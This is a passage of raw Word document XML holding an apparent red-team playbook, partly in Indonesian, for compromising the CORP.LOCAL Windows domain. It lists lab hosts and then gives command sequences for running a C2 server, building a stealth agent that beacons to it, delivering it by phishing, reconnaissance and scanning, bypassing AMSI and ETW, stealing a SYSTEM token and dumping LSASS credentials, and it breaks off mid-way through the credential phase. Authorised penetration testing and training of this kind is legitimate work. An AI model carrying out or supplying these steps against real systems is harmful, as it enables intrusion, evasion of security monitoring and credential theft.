        <w:t>Target: Compromise domain CORP.LOCAL. Berhasil jika mendapatkan Domain Admin credentials dan dapat melakukan DCSync dari Domain Controller.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Infrastruktur</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
        <w:gridCol w:w="3025"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Host</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>IP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F1F1F"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Role</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Kali Linux / C2 Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>10.10.5.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C2 Server, Operator Machine</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DESKTOP-VICTIM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>192.168.1.105</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Initial foothold, user john.doe</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>FS01 (File Server)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>192.168.1.50</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Lateral target</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DC01 (Domain Controller)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>192.168.1.100</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4252"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F8F8F8"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="1F1F1F"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Final target</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Phase 1 — Initial Access &amp; Setup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Deploy C2 server di mesin attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ENCRYPTION_KEY=EngagementKey2026 ./bin/server \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --tls --tls-port 8443 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --auth --api-key "RedTeamOps2026" \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --profile office365</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Build agent untuk initial foothold.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>make agent-win-stealth \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  C2_SERVER=https://10.10.5.1:8443 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  ENC_KEY=EngagementKey2026 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  INTERVAL=30 JITTER=30 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  PROFILE=office365 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  KILL_DATE=2026-06-30</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Delivery agent ke DESKTOP-VICTIM (via phishing, exploit, atau social engineering).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Verifikasi agent check-in.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>./bin/operator console --server https://10.10.5.1:8443 --api-key RedTeamOps2026</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>agents list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Phase 2 — Situational Awareness</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Basic recon dari posisi agent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd AGENTID "whoami /all" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd AGENTID "systeminfo" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd AGENTID "ipconfig /all" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd AGENTID "net localgroup administrators" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Scan jaringan internal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>netscan AGENTID \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --targets 192.168.1.0/24 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --ports 88,389,445,3389,5985 \</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># → DC01: 88,389,445 open (Domain Controller)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># → FS01: 445,3389 open (File Server)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Screenshot untuk konteks visual.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>screenshot AGENTID --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Phase 3 — Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Bypass AMSI dan ETW.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass amsi AGENTID --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>bypass etw  AGENTID --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>evasion unhook AGENTID --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Steal SYSTEM token.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token list AGENTID --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Identifikasi PID lsass atau winlogon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>token steal AGENTID --pid 624 --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cmd AGENTID "whoami" --wait</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># → NT AUTHORITY\SYSTEM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="280" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>Phase 4 — Credential Access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:before="20" w:after="20"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="141414"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Dump LSASS.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:left="170"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F1F1F"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>creds lsass AGENTID --output "C:\Temp\ls.dmp" --wait</w:t>
      </w:r>
